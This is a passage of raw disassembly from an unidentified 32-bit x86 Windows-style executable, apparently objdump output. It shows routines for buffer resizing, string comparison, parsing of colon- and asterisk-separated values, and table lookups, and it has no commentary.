  40390a:	e8 3e 1e 00 00       	call   0x40574d
  40390f:	ff 36                	push   (%esi)
  403911:	e8 58 45 01 00       	call   0x417e6e
  403916:	59                   	pop    %ecx
  403917:	eb 16                	jmp    0x40392f
  403919:	ff 36                	push   (%esi)
  40391b:	e8 b6 67 01 00       	call   0x41a0d6
  403920:	8b f8                	mov    %eax,%edi
  403922:	59                   	pop    %ecx
  403923:	59                   	pop    %ecx
  403924:	85 ff                	test   %edi,%edi
  403926:	75 07                	jne    0x40392f
  403928:	8b cd                	mov    %ebp,%ecx
  40392a:	e8 56 df ff ff       	call   0x401885
  40392f:	89 3e                	mov    %edi,(%esi)
  403931:	5f                   	pop    %edi
  403932:	5d                   	pop    %ebp
  403933:	89 5e 08             	mov    %ebx,0x8(%esi)
  403936:	5b                   	pop    %ebx
  403937:	5e                   	pop    %esi
  403938:	c2 04 00             	ret    $0x4
  40393b:	8b 44 24 04          	mov    0x4(%esp),%eax
  40393f:	56                   	push   %esi
  403940:	8b f1                	mov    %ecx,%esi
  403942:	01 46 04             	add    %eax,0x4(%esi)
  403945:	8b 4e 04             	mov    0x4(%esi),%ecx
  403948:	3b 4e 08             	cmp    0x8(%esi),%ecx
  40394b:	0f 86 a4 00 00 00    	jbe    0x4039f5
  403951:	8b 46 0c             	mov    0xc(%esi),%eax
  403954:	53                   	push   %ebx
  403955:	55                   	push   %ebp
  403956:	bd d4 0c 45 00       	mov    $0x450cd4,%ebp
  40395b:	57                   	push   %edi
  40395c:	85 c0                	test   %eax,%eax
  40395e:	74 1a                	je     0x40397a
  403960:	3b c8                	cmp    %eax,%ecx
  403962:	76 16                	jbe    0x40397a
  403964:	50                   	push   %eax
  403965:	68 20 73 42 00       	push   $0x427320
  40396a:	55                   	push   %ebp
  40396b:	e8 a9 de ff ff       	call   0x401819
  403970:	83 c4 0c             	add    $0xc,%esp
  403973:	8b cd                	mov    %ebp,%ecx
  403975:	e8 0b df ff ff       	call   0x401885
  40397a:	8b 46 08             	mov    0x8(%esi),%eax
  40397d:	8b 5e 04             	mov    0x4(%esi),%ebx
  403980:	c1 e8 02             	shr    $0x2,%eax
  403983:	83 c0 20             	add    $0x20,%eax
  403986:	03 46 08             	add    0x8(%esi),%eax
  403989:	3b d8                	cmp    %eax,%ebx
  40398b:	77 02                	ja     0x40398f
  40398d:	8b d8                	mov    %eax,%ebx
  40398f:	6b c3 0c             	imul   $0xc,%ebx,%eax
  403992:	80 7e 10 00          	cmpb   $0x0,0x10(%esi)
  403996:	50                   	push   %eax
  403997:	74 3e                	je     0x4039d7
  403999:	e8 2d 67 01 00       	call   0x41a0cb
  40399e:	8b f8                	mov    %eax,%edi
  4039a0:	59                   	pop    %ecx
  4039a1:	85 ff                	test   %edi,%edi
  4039a3:	75 07                	jne    0x4039ac
  4039a5:	8b cd                	mov    %ebp,%ecx
  4039a7:	e8 d9 de ff ff       	call   0x401885
  4039ac:	83 3e 00             	cmpl   $0x0,(%esi)
  4039af:	74 3c                	je     0x4039ed
  4039b1:	6b 46 08 0c          	imul   $0xc,0x8(%esi),%eax
  4039b5:	50                   	push   %eax
  4039b6:	ff 36                	push   (%esi)
  4039b8:	57                   	push   %edi
  4039b9:	e8 92 0a 01 00       	call   0x414450
  4039be:	6b 46 08 0c          	imul   $0xc,0x8(%esi),%eax
  4039c2:	83 c4 0c             	add    $0xc,%esp
  4039c5:	50                   	push   %eax
  4039c6:	ff 36                	push   (%esi)
  4039c8:	e8 80 1d 00 00       	call   0x40574d
  4039cd:	ff 36                	push   (%esi)
  4039cf:	e8 9a 44 01 00       	call   0x417e6e
  4039d4:	59                   	pop    %ecx
  4039d5:	eb 16                	jmp    0x4039ed
  4039d7:	ff 36                	push   (%esi)
  4039d9:	e8 f8 66 01 00       	call   0x41a0d6
  4039de:	8b f8                	mov    %eax,%edi
  4039e0:	59                   	pop    %ecx
  4039e1:	59                   	pop    %ecx
  4039e2:	85 ff                	test   %edi,%edi
  4039e4:	75 07                	jne    0x4039ed
  4039e6:	8b cd                	mov    %ebp,%ecx
  4039e8:	e8 98 de ff ff       	call   0x401885
  4039ed:	89 3e                	mov    %edi,(%esi)
  4039ef:	5f                   	pop    %edi
  4039f0:	5d                   	pop    %ebp
  4039f1:	89 5e 08             	mov    %ebx,0x8(%esi)
  4039f4:	5b                   	pop    %ebx
  4039f5:	5e                   	pop    %esi
  4039f6:	c2 04 00             	ret    $0x4
  4039f9:	55                   	push   %ebp
  4039fa:	8b ec                	mov    %esp,%ebp
  4039fc:	8b 55 0c             	mov    0xc(%ebp),%edx
  4039ff:	83 ec 0c             	sub    $0xc,%esp
  403a02:	80 3a 00             	cmpb   $0x0,(%edx)
  403a05:	53                   	push   %ebx
  403a06:	56                   	push   %esi
  403a07:	57                   	push   %edi
  403a08:	8b d9                	mov    %ecx,%ebx
  403a0a:	74 78                	je     0x403a84
  403a0c:	8b 45 08             	mov    0x8(%ebp),%eax
  403a0f:	52                   	push   %edx
  403a10:	89 45 f4             	mov    %eax,-0xc(%ebp)
  403a13:	e8 26 92 01 00       	call   0x41cc3e
  403a18:	59                   	pop    %ecx
  403a19:	8b 4d 10             	mov    0x10(%ebp),%ecx
  403a1c:	89 45 f8             	mov    %eax,-0x8(%ebp)
  403a1f:	8b 45 14             	mov    0x14(%ebp),%eax
  403a22:	6a 22                	push   $0x22
  403a24:	5f                   	pop    %edi
  403a25:	85 c0                	test   %eax,%eax
  403a27:	74 32                	je     0x403a5b
  403a29:	8d 50 ff             	lea    -0x1(%eax),%edx
  403a2c:	8d 14 51             	lea    (%ecx,%edx,2),%edx
  403a2f:	0f b7 32             	movzwl (%edx),%esi
  403a32:	83 fe 20             	cmp    $0x20,%esi
  403a35:	74 05                	je     0x403a3c
  403a37:	83 fe 09             	cmp    $0x9,%esi
  403a3a:	75 0d                	jne    0x403a49
  403a3c:	33 f6                	xor    %esi,%esi
  403a3e:	66 89 32             	mov    %si,(%edx)
  403a41:	83 ea 02             	sub    $0x2,%edx
  403a44:	83 e8 01             	sub    $0x1,%eax
  403a47:	75 e6                	jne    0x403a2f
  403a49:	85 c0                	test   %eax,%eax
  403a4b:	74 0e                	je     0x403a5b
  403a4d:	66 39 7c 41 fe       	cmp    %di,-0x2(%ecx,%eax,2)
  403a52:	75 07                	jne    0x403a5b
  403a54:	33 d2                	xor    %edx,%edx
  403a56:	66 89 54 41 fe       	mov    %dx,-0x2(%ecx,%eax,2)
  403a5b:	33 d2                	xor    %edx,%edx
  403a5d:	66 89 14 41          	mov    %dx,(%ecx,%eax,2)
  403a61:	66 39 39             	cmp    %di,(%ecx)
  403a64:	75 03                	jne    0x403a69
  403a66:	83 c1 02             	add    $0x2,%ecx
  403a69:	51                   	push   %ecx
  403a6a:	e8 30 7f 01 00       	call   0x41b99f
  403a6f:	51                   	push   %ecx
  403a70:	51                   	push   %ecx
  403a71:	8b fc                	mov    %esp,%edi
  403a73:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403a76:	8d 75 f4             	lea    -0xc(%ebp),%esi
  403a79:	8d 4b 28             	lea    0x28(%ebx),%ecx
  403a7c:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403a7d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403a7e:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403a7f:	e8 fc 0a 00 00       	call   0x404580
  403a84:	5f                   	pop    %edi
  403a85:	5e                   	pop    %esi
  403a86:	5b                   	pop    %ebx
  403a87:	8b e5                	mov    %ebp,%esp
  403a89:	5d                   	pop    %ebp
  403a8a:	c2 10 00             	ret    $0x10
  403a8d:	55                   	push   %ebp
  403a8e:	8d 6c 24 90          	lea    -0x70(%esp),%ebp
  403a92:	8b 45 78             	mov    0x78(%ebp),%eax
  403a95:	81 ec a0 00 00 00    	sub    $0xa0,%esp
  403a9b:	8b 08                	mov    (%eax),%ecx
  403a9d:	8b 45 7c             	mov    0x7c(%ebp),%eax
  403aa0:	56                   	push   %esi
  403aa1:	57                   	push   %edi
  403aa2:	6b f9 0c             	imul   $0xc,%ecx,%edi
  403aa5:	8b 30                	mov    (%eax),%esi
  403aa7:	8d 45 d0             	lea    -0x30(%ebp),%eax
  403aaa:	6a 50                	push   $0x50
  403aac:	ff b7 48 10 43 00    	push   0x431048(%edi)
  403ab2:	50                   	push   %eax
  403ab3:	e8 c8 2a 00 00       	call   0x406580
  403ab8:	8d 45 d0             	lea    -0x30(%ebp),%eax
  403abb:	6a 3a                	push   $0x3a
  403abd:	50                   	push   %eax
  403abe:	e8 bd 07 01 00       	call   0x414280
  403ac3:	59                   	pop    %ecx
  403ac4:	59                   	pop    %ecx
  403ac5:	85 c0                	test   %eax,%eax
  403ac7:	74 03                	je     0x403acc
  403ac9:	c6 00 00             	movb   $0x0,(%eax)
  403acc:	6b f6 0c             	imul   $0xc,%esi,%esi
  403acf:	8d 45 20             	lea    0x20(%ebp),%eax
  403ad2:	6a 50                	push   $0x50
  403ad4:	ff b6 48 10 43 00    	push   0x431048(%esi)
  403ada:	50                   	push   %eax
  403adb:	e8 a0 2a 00 00       	call   0x406580
  403ae0:	8d 45 20             	lea    0x20(%ebp),%eax
  403ae3:	6a 3a                	push   $0x3a
  403ae5:	50                   	push   %eax
  403ae6:	e8 95 07 01 00       	call   0x414280
  403aeb:	59                   	pop    %ecx
  403aec:	59                   	pop    %ecx
  403aed:	85 c0                	test   %eax,%eax
  403aef:	74 03                	je     0x403af4
  403af1:	c6 00 00             	movb   $0x0,(%eax)
  403af4:	8d 45 20             	lea    0x20(%ebp),%eax
  403af7:	50                   	push   %eax
  403af8:	8d 45 d0             	lea    -0x30(%ebp),%eax
  403afb:	50                   	push   %eax
  403afc:	e8 3f 6b 01 00       	call   0x41a640
  403b01:	59                   	pop    %ecx
  403b02:	59                   	pop    %ecx
  403b03:	85 c0                	test   %eax,%eax
  403b05:	75 1a                	jne    0x403b21
  403b07:	8b 87 44 10 43 00    	mov    0x431044(%edi),%eax
  403b0d:	8b 8e 44 10 43 00    	mov    0x431044(%esi),%ecx
  403b13:	3b c1                	cmp    %ecx,%eax
  403b15:	75 04                	jne    0x403b1b
  403b17:	33 c0                	xor    %eax,%eax
  403b19:	eb 06                	jmp    0x403b21
  403b1b:	1b c0                	sbb    %eax,%eax
  403b1d:	83 e0 fe             	and    $0xfffffffe,%eax
  403b20:	40                   	inc    %eax
  403b21:	5f                   	pop    %edi
  403b22:	5e                   	pop    %esi
  403b23:	8d 65 70             	lea    0x70(%ebp),%esp
  403b26:	5d                   	pop    %ebp
  403b27:	c3                   	ret
  403b28:	8b 44 24 04          	mov    0x4(%esp),%eax
  403b2c:	8b 08                	mov    (%eax),%ecx
  403b2e:	8b 44 24 08          	mov    0x8(%esp),%eax
  403b32:	8b 00                	mov    (%eax),%eax
  403b34:	6b c0 0c             	imul   $0xc,%eax,%eax
  403b37:	ff b0 48 10 43 00    	push   0x431048(%eax)
  403b3d:	6b c1 0c             	imul   $0xc,%ecx,%eax
  403b40:	ff b0 48 10 43 00    	push   0x431048(%eax)
  403b46:	e8 f5 6a 01 00       	call   0x41a640
  403b4b:	59                   	pop    %ecx
  403b4c:	59                   	pop    %ecx
  403b4d:	c3                   	ret
  403b4e:	55                   	push   %ebp
  403b4f:	8b ec                	mov    %esp,%ebp
  403b51:	8b 45 0c             	mov    0xc(%ebp),%eax
  403b54:	83 ec 50             	sub    $0x50,%esp
  403b57:	8b 00                	mov    (%eax),%eax
  403b59:	56                   	push   %esi
  403b5a:	57                   	push   %edi
  403b5b:	6b f8 0c             	imul   $0xc,%eax,%edi
  403b5e:	8d 45 b0             	lea    -0x50(%ebp),%eax
  403b61:	6a 50                	push   $0x50
  403b63:	ff b7 48 10 43 00    	push   0x431048(%edi)
  403b69:	50                   	push   %eax
  403b6a:	e8 11 2a 00 00       	call   0x406580
  403b6f:	8d 45 b0             	lea    -0x50(%ebp),%eax
  403b72:	6a 3a                	push   $0x3a
  403b74:	50                   	push   %eax
  403b75:	e8 06 07 01 00       	call   0x414280
  403b7a:	59                   	pop    %ecx
  403b7b:	59                   	pop    %ecx
  403b7c:	85 c0                	test   %eax,%eax
  403b7e:	74 03                	je     0x403b83
  403b80:	c6 00 00             	movb   $0x0,(%eax)
  403b83:	8b 75 08             	mov    0x8(%ebp),%esi
  403b86:	8d 45 b0             	lea    -0x50(%ebp),%eax
  403b89:	50                   	push   %eax
  403b8a:	ff 76 08             	push   0x8(%esi)
  403b8d:	e8 ae 6a 01 00       	call   0x41a640
  403b92:	59                   	pop    %ecx
  403b93:	59                   	pop    %ecx
  403b94:	85 c0                	test   %eax,%eax
  403b96:	75 15                	jne    0x403bad
  403b98:	8b 87 44 10 43 00    	mov    0x431044(%edi),%eax
  403b9e:	39 46 04             	cmp    %eax,0x4(%esi)
  403ba1:	75 04                	jne    0x403ba7
  403ba3:	33 c0                	xor    %eax,%eax
  403ba5:	eb 06                	jmp    0x403bad
  403ba7:	1b c0                	sbb    %eax,%eax
  403ba9:	83 e0 fe             	and    $0xfffffffe,%eax
  403bac:	40                   	inc    %eax
  403bad:	5f                   	pop    %edi
  403bae:	5e                   	pop    %esi
  403baf:	8b e5                	mov    %ebp,%esp
  403bb1:	5d                   	pop    %ebp
  403bb2:	c3                   	ret
  403bb3:	8b 44 24 08          	mov    0x8(%esp),%eax
  403bb7:	8b 00                	mov    (%eax),%eax
  403bb9:	6b c0 0c             	imul   $0xc,%eax,%eax
  403bbc:	ff b0 48 10 43 00    	push   0x431048(%eax)
  403bc2:	ff 74 24 08          	push   0x8(%esp)
  403bc6:	e8 75 6a 01 00       	call   0x41a640
  403bcb:	59                   	pop    %ecx
  403bcc:	59                   	pop    %ecx
  403bcd:	c3                   	ret
  403bce:	8b 44 24 04          	mov    0x4(%esp),%eax
  403bd2:	56                   	push   %esi
  403bd3:	8b 08                	mov    (%eax),%ecx
  403bd5:	8b 44 24 0c          	mov    0xc(%esp),%eax
  403bd9:	8b 10                	mov    (%eax),%edx
  403bdb:	6b c1 0c             	imul   $0xc,%ecx,%eax
  403bde:	8b 0d 14 3f 43 00    	mov    0x433f14,%ecx
  403be4:	8b 34 08             	mov    (%eax,%ecx,1),%esi
  403be7:	6b c2 0c             	imul   $0xc,%edx,%eax
  403bea:	8b 04 08             	mov    (%eax,%ecx,1),%eax
  403bed:	3b f0                	cmp    %eax,%esi
  403bef:	75 04                	jne    0x403bf5
  403bf1:	33 c0                	xor    %eax,%eax
  403bf3:	5e                   	pop    %esi
  403bf4:	c3                   	ret
  403bf5:	1b c0                	sbb    %eax,%eax
  403bf7:	83 e0 fe             	and    $0xfffffffe,%eax
  403bfa:	40                   	inc    %eax
  403bfb:	5e                   	pop    %esi
  403bfc:	c3                   	ret
  403bfd:	8b 44 24 04          	mov    0x4(%esp),%eax
  403c01:	8b 0d 14 3f 43 00    	mov    0x433f14,%ecx
  403c07:	8b 10                	mov    (%eax),%edx
  403c09:	8b 44 24 08          	mov    0x8(%esp),%eax
  403c0d:	8b 00                	mov    (%eax),%eax
  403c0f:	6b c0 0c             	imul   $0xc,%eax,%eax
  403c12:	ff 74 08 04          	push   0x4(%eax,%ecx,1)
  403c16:	6b c2 0c             	imul   $0xc,%edx,%eax
  403c19:	ff 74 08 04          	push   0x4(%eax,%ecx,1)
  403c1d:	e8 1e 6a 01 00       	call   0x41a640
  403c22:	59                   	pop    %ecx
  403c23:	59                   	pop    %ecx
  403c24:	c3                   	ret
  403c25:	8b 44 24 08          	mov    0x8(%esp),%eax
  403c29:	8b 00                	mov    (%eax),%eax
  403c2b:	6b c8 0c             	imul   $0xc,%eax,%ecx
  403c2e:	a1 14 3f 43 00       	mov    0x433f14,%eax
  403c33:	ff 74 01 04          	push   0x4(%ecx,%eax,1)
  403c37:	ff 74 24 08          	push   0x8(%esp)
  403c3b:	e8 00 6a 01 00       	call   0x41a640
  403c40:	59                   	pop    %ecx
  403c41:	59                   	pop    %ecx
  403c42:	c3                   	ret
  403c43:	55                   	push   %ebp
  403c44:	8b ec                	mov    %esp,%ebp
  403c46:	81 ec 00 04 00 00    	sub    $0x400,%esp
  403c4c:	8d 85 00 fc ff ff    	lea    -0x400(%ebp),%eax
  403c52:	68 00 02 00 00       	push   $0x200
  403c57:	50                   	push   %eax
  403c58:	68 48 74 42 00       	push   $0x427448
  403c5d:	ff 75 08             	push   0x8(%ebp)
  403c60:	e8 61 00 00 00       	call   0x403cc6
  403c65:	84 c0                	test   %al,%al
  403c67:	74 57                	je     0x403cc0
  403c69:	57                   	push   %edi
  403c6a:	8d 85 00 fc ff ff    	lea    -0x400(%ebp),%eax
  403c70:	6a 2a                	push   $0x2a
  403c72:	50                   	push   %eax
  403c73:	e8 56 05 01 00       	call   0x4141ce
  403c78:	8b f8                	mov    %eax,%edi
  403c7a:	59                   	pop    %ecx
  403c7b:	59                   	pop    %ecx
  403c7c:	85 ff                	test   %edi,%edi
  403c7e:	74 3d                	je     0x403cbd
  403c80:	56                   	push   %esi
  403c81:	8d 85 00 fc ff ff    	lea    -0x400(%ebp),%eax
  403c87:	50                   	push   %eax
  403c88:	e8 51 3d 00 00       	call   0x4079de
  403c8d:	8b 75 0c             	mov    0xc(%ebp),%esi
  403c90:	89 06                	mov    %eax,(%esi)
  403c92:	8d 47 02             	lea    0x2(%edi),%eax
  403c95:	50                   	push   %eax
  403c96:	e8 43 3d 00 00       	call   0x4079de
  403c9b:	8b 4d 10             	mov    0x10(%ebp),%ecx
  403c9e:	89 01                	mov    %eax,(%ecx)
  403ca0:	83 3e 64             	cmpl   $0x64,(%esi)
  403ca3:	75 05                	jne    0x403caa
  403ca5:	83 f8 64             	cmp    $0x64,%eax
  403ca8:	74 0e                	je     0x403cb8
  403caa:	83 3e 00             	cmpl   $0x0,(%esi)
  403cad:	7e 09                	jle    0x403cb8
  403caf:	85 c0                	test   %eax,%eax
  403cb1:	7e 05                	jle    0x403cb8
  403cb3:	33 c0                	xor    %eax,%eax
  403cb5:	40                   	inc    %eax
  403cb6:	eb 02                	jmp    0x403cba
  403cb8:	33 c0                	xor    %eax,%eax
  403cba:	5e                   	pop    %esi
  403cbb:	eb 02                	jmp    0x403cbf
  403cbd:	32 c0                	xor    %al,%al
  403cbf:	5f                   	pop    %edi
  403cc0:	8b e5                	mov    %ebp,%esp
  403cc2:	5d                   	pop    %ebp
  403cc3:	c2 0c 00             	ret    $0xc
  403cc6:	55                   	push   %ebp
  403cc7:	8b ec                	mov    %esp,%ebp
  403cc9:	81 ec f0 00 00 00    	sub    $0xf0,%esp
  403ccf:	8d 85 10 ff ff ff    	lea    -0xf0(%ebp),%eax
  403cd5:	56                   	push   %esi
  403cd6:	ff 75 0c             	push   0xc(%ebp)
  403cd9:	8b f1                	mov    %ecx,%esi
  403cdb:	ff 75 08             	push   0x8(%ebp)
  403cde:	68 1c 74 42 00       	push   $0x42741c
  403ce3:	6a 50                	push   $0x50
  403ce5:	50                   	push   %eax
  403ce6:	e8 2a fa ff ff       	call   0x403715
  403ceb:	83 c4 14             	add    $0x14,%esp
  403cee:	8d 45 b0             	lea    -0x50(%ebp),%eax
  403cf1:	6a 50                	push   $0x50
  403cf3:	50                   	push   %eax
  403cf4:	8d 85 10 ff ff ff    	lea    -0xf0(%ebp),%eax
  403cfa:	50                   	push   %eax
  403cfb:	e8 12 3b 00 00       	call   0x407812
  403d00:	ff 75 14             	push   0x14(%ebp)
  403d03:	8d 45 b0             	lea    -0x50(%ebp),%eax
  403d06:	8b ce                	mov    %esi,%ecx
  403d08:	ff 75 10             	push   0x10(%ebp)
  403d0b:	50                   	push   %eax
  403d0c:	e8 0c 01 00 00       	call   0x403e1d
  403d11:	5e                   	pop    %esi
  403d12:	8b e5                	mov    %ebp,%esp
  403d14:	5d                   	pop    %ebp
  403d15:	c2 10 00             	ret    $0x10
  403d18:	55                   	push   %ebp
  403d19:	8d 6c 24 9c          	lea    -0x64(%esp),%ebp
  403d1d:	81 ec ac 00 00 00    	sub    $0xac,%esp
  403d23:	56                   	push   %esi
  403d24:	8b f1                	mov    %ecx,%esi
  403d26:	83 7e 2c 00          	cmpl   $0x0,0x2c(%esi)
  403d2a:	77 07                	ja     0x403d33
  403d2c:	32 c0                	xor    %al,%al
  403d2e:	e9 a4 00 00 00       	jmp    0x403dd7
  403d33:	83 7d 74 00          	cmpl   $0x0,0x74(%ebp)
  403d37:	8b 45 6c             	mov    0x6c(%ebp),%eax
  403d3a:	89 45 5c             	mov    %eax,0x5c(%ebp)
  403d3d:	8d 45 08             	lea    0x8(%ebp),%eax
  403d40:	c6 45 08 00          	movb   $0x0,0x8(%ebp)
  403d44:	89 45 60             	mov    %eax,0x60(%ebp)
  403d47:	74 0e                	je     0x403d57
  403d49:	6a 50                	push   $0x50
  403d4b:	8d 45 b8             	lea    -0x48(%ebp),%eax
  403d4e:	50                   	push   %eax
  403d4f:	ff 75 74             	push   0x74(%ebp)
  403d52:	e8 bb 3a 00 00       	call   0x407812
  403d57:	8b 45 70             	mov    0x70(%ebp),%eax
  403d5a:	83 e8 00             	sub    $0x0,%eax
  403d5d:	74 2e                	je     0x403d8d
  403d5f:	83 e8 01             	sub    $0x1,%eax
  403d62:	74 10                	je     0x403d74
  403d64:	83 e8 01             	sub    $0x1,%eax
  403d67:	75 34                	jne    0x403d9d
  403d69:	8d 45 b8             	lea    -0x48(%ebp),%eax
  403d6c:	50                   	push   %eax
  403d6d:	68 18 74 42 00       	push   $0x427418
  403d72:	eb 09                	jmp    0x403d7d
  403d74:	8d 45 b8             	lea    -0x48(%ebp),%eax
  403d77:	50                   	push   %eax
  403d78:	68 14 74 42 00       	push   $0x427414
  403d7d:	8d 45 08             	lea    0x8(%ebp),%eax
  403d80:	6a 50                	push   $0x50
  403d82:	50                   	push   %eax
  403d83:	e8 35 0b 00 00       	call   0x4048bd
  403d88:	83 c4 10             	add    $0x10,%esp
  403d8b:	eb 10                	jmp    0x403d9d
  403d8d:	6a 50                	push   $0x50
  403d8f:	68 10 74 42 00       	push   $0x427410
  403d94:	8d 45 08             	lea    0x8(%ebp),%eax
  403d97:	50                   	push   %eax
  403d98:	e8 e3 27 00 00       	call   0x406580
  403d9d:	68 4e 3b 40 00       	push   $0x403b4e
  403da2:	6a 04                	push   $0x4
  403da4:	ff 76 18             	push   0x18(%esi)
  403da7:	8d 45 58             	lea    0x58(%ebp),%eax
  403daa:	ff 76 14             	push   0x14(%esi)
  403dad:	50                   	push   %eax
  403dae:	e8 2e 63 01 00       	call   0x41a0e1
  403db3:	83 c4 14             	add    $0x14,%esp
  403db6:	85 c0                	test   %eax,%eax
  403db8:	0f 84 6e ff ff ff    	je     0x403d2c
  403dbe:	6b 00 0c             	imul   $0xc,(%eax),%eax
  403dc1:	ff 75 7c             	push   0x7c(%ebp)
  403dc4:	ff b0 48 10 43 00    	push   0x431048(%eax)
  403dca:	ff 75 78             	push   0x78(%ebp)
  403dcd:	e8 7e 69 01 00       	call   0x41a750
  403dd2:	83 c4 0c             	add    $0xc,%esp
  403dd5:	b0 01                	mov    $0x1,%al
  403dd7:	5e                   	pop    %esi
  403dd8:	8d 65 64             	lea    0x64(%ebp),%esp
  403ddb:	5d                   	pop    %ebp
  403ddc:	c2 14 00             	ret    $0x14
  403ddf:	55                   	push   %ebp
  403de0:	8b ec                	mov    %esp,%ebp
  403de2:	83 ec 50             	sub    $0x50,%esp
  403de5:	8d 45 b0             	lea    -0x50(%ebp),%eax
  403de8:	56                   	push   %esi
  403de9:	6a 50                	push   $0x50
  403deb:	50                   	push   %eax
  403dec:	ff 75 18             	push   0x18(%ebp)
  403def:	8b f1                	mov    %ecx,%esi
  403df1:	ff 75 14             	push   0x14(%ebp)
  403df4:	ff 75 08             	push   0x8(%ebp)
  403df7:	e8 1c ff ff ff       	call   0x403d18
  403dfc:	84 c0                	test   %al,%al
  403dfe:	74 16                	je     0x403e16
  403e00:	ff 75 10             	push   0x10(%ebp)
  403e03:	8d 45 b0             	lea    -0x50(%ebp),%eax
  403e06:	8b ce                	mov    %esi,%ecx
  403e08:	ff 75 0c             	push   0xc(%ebp)
  403e0b:	50                   	push   %eax
  403e0c:	e8 0c 00 00 00       	call   0x403e1d
  403e11:	84 c0                	test   %al,%al
  403e13:	0f 95 c0             	setne  %al
  403e16:	5e                   	pop    %esi
  403e17:	8b e5                	mov    %ebp,%esp
  403e19:	5d                   	pop    %ebp
  403e1a:	c2 14 00             	ret    $0x14
  403e1d:	55                   	push   %ebp
  403e1e:	8b ec                	mov    %esp,%ebp
  403e20:	83 ec 0c             	sub    $0xc,%esp
  403e23:	57                   	push   %edi
  403e24:	8b f9                	mov    %ecx,%edi
  403e26:	83 7f 2c 00          	cmpl   $0x0,0x2c(%edi)
  403e2a:	77 04                	ja     0x403e30
  403e2c:	32 c0                	xor    %al,%al
  403e2e:	eb 3a                	jmp    0x403e6a
  403e30:	68 25 3c 40 00       	push   $0x403c25
  403e35:	6a 04                	push   $0x4
  403e37:	ff 77 54             	push   0x54(%edi)
  403e3a:	ff 77 50             	push   0x50(%edi)
  403e3d:	ff 75 08             	push   0x8(%ebp)
  403e40:	e8 9c 62 01 00       	call   0x41a0e1
  403e45:	83 c4 14             	add    $0x14,%esp
  403e48:	85 c0                	test   %eax,%eax
  403e4a:	74 e0                	je     0x403e2c
  403e4c:	56                   	push   %esi
  403e4d:	6b 30 0c             	imul   $0xc,(%eax),%esi
  403e50:	ff 75 10             	push   0x10(%ebp)
  403e53:	03 77 28             	add    0x28(%edi),%esi
  403e56:	8d 7d f4             	lea    -0xc(%ebp),%edi
  403e59:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403e5a:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403e5b:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403e5c:	ff 75 fc             	push   -0x4(%ebp)
  403e5f:	ff 75 0c             	push   0xc(%ebp)
  403e62:	e8 74 27 00 00       	call   0x4065db
  403e67:	b0 01                	mov    $0x1,%al
  403e69:	5e                   	pop    %esi
  403e6a:	5f                   	pop    %edi
  403e6b:	8b e5                	mov    %ebp,%esp
  403e6d:	5d                   	pop    %ebp
  403e6e:	c2 0c 00             	ret    $0xc
  403e71:	56                   	push   %esi
  403e72:	ff 74 24 08          	push   0x8(%esp)
  403e76:	8b f1                	mov    %ecx,%esi
  403e78:	e8 19 00 00 00       	call   0x403e96
  403e7d:	8b ce                	mov    %esi,%ecx
  403e7f:	e8 1e 07 00 00       	call   0x4045a2
  403e84:	80 7e 64 00          	cmpb   $0x0,0x64(%esi)
  403e88:	5e                   	pop    %esi
  403e89:	74 08                	je     0x403e93
  403e8b:	6a 01                	push   $0x1
  403e8d:	ff 15 78 1e 43 00    	call   *0x431e78
  403e93:	c2 04 00             	ret    $0x4
  403e96:	55                   	push   %ebp
  403e97:	83 ec 6c             	sub    $0x6c,%esp
  403e9a:	b8 7a 64 42 00       	mov    $0x42647a,%eax
  403e9f:	e8 00 ed 00 00       	call   0x412ba4
  403ea4:	b8 7c 42 00 00       	mov    $0x427c,%eax
  403ea9:	e8 22 ed 00 00       	call   0x412bd0
  403eae:	53                   	push   %ebx
  403eaf:	56                   	push   %esi
  403eb0:	57                   	push   %edi
  403eb1:	6a 5c                	push   $0x5c
  403eb3:	58                   	pop    %eax
  403eb4:	50                   	push   %eax
  403eb5:	ff 75 78             	push   0x78(%ebp)
  403eb8:	8b f1                	mov    %ecx,%esi
  403eba:	89 45 44             	mov    %eax,0x44(%ebp)
  403ebd:	89 75 48             	mov    %esi,0x48(%ebp)
  403ec0:	e8 09 03 01 00       	call   0x4141ce
  403ec5:	59                   	pop    %ecx
  403ec6:	33 db                	xor    %ebx,%ebx
  403ec8:	85 c0                	test   %eax,%eax
  403eca:	59                   	pop    %ecx
  403ecb:	8d 85 9c ed ff ff    	lea    -0x1264(%ebp),%eax
  403ed1:	75 31                	jne    0x403f04
  403ed3:	bf 00 08 00 00       	mov    $0x800,%edi
  403ed8:	57                   	push   %edi
  403ed9:	50                   	push   %eax
  403eda:	53                   	push   %ebx
  403edb:	ff 15 64 70 42 00    	call   *0x427064
  403ee1:	8d 85 9c ed ff ff    	lea    -0x1264(%ebp),%eax
  403ee7:	50                   	push   %eax
  403ee8:	e8 06 f7 ff ff       	call   0x4035f3
  403eed:	57                   	push   %edi
  403eee:	ff 75 78             	push   0x78(%ebp)
  403ef1:	33 c9                	xor    %ecx,%ecx
  403ef3:	66 89 08             	mov    %cx,(%eax)
  403ef6:	8d 85 9c ed ff ff    	lea    -0x1264(%ebp),%eax
  403efc:	50                   	push   %eax
  403efd:	e8 b1 26 00 00       	call   0x4065b3
  403f02:	eb 0e                	jmp    0x403f12
  403f04:	68 00 08 00 00       	push   $0x800
  403f09:	ff 75 78             	push   0x78(%ebp)
  403f0c:	50                   	push   %eax
  403f0d:	e8 c9 26 00 00       	call   0x4065db
  403f12:	8d 8d 78 dd ff ff    	lea    -0x2288(%ebp),%ecx
  403f18:	e8 46 db ff ff       	call   0x401a63
  403f1d:	6a 04                	push   $0x4
  403f1f:	8d 85 9c ed ff ff    	lea    -0x1264(%ebp),%eax
  403f25:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  403f28:	50                   	push   %eax
  403f29:	8d 8d 78 dd ff ff    	lea    -0x2288(%ebp),%ecx
  403f2f:	e8 72 de ff ff       	call   0x401da6
  403f34:	84 c0                	test   %al,%al
  403f36:	0f 84 b7 03 00 00    	je     0x4042f3
  403f3c:	8b fb                	mov    %ebx,%edi
  403f3e:	39 3d e4 14 43 00    	cmp    %edi,0x4314e4
  403f44:	76 1c                	jbe    0x403f62
  403f46:	57                   	push   %edi
  403f47:	8b ce                	mov    %esi,%ecx
  403f49:	e8 17 06 00 00       	call   0x404565
